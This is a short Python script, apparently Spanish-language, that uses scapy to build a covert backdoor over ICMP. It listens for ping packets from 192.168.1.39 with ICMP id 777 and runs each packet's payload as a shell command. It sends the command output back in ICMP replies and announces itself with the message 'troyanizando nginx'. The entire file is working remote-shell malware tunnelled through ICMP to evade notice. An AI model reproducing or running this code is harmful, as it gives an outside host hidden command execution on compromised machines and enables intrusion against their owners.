from scapy.all import *
import subprocess



def analizar_reenviar(paquete):
        if paquete[IP].src=="192.168.1.39" and paquete[ICMP].id==777:
            paquete = (paquete[Raw].load).decode('utf-8', errors='ignore')
            comando=subprocess.getoutput(paquete)
            if not comando:
                send(IP(dst="192.168.1.39")/ICMP(type=0,id=777)/Raw(load="exito"))
            else:
                send(IP(dst="192.168.1.39")/ICMP(type=0,id=777)/Raw(load=comando))



def recibir_trafico():
    send(IP(dst="192.168.1.39")/ICMP(type=0,id=777)/Raw(load="troyanizando nginx"))

    sniff(iface="enp0s3", prn=analizar_reenviar, filter="icmp", store="0")
recibir_trafico()
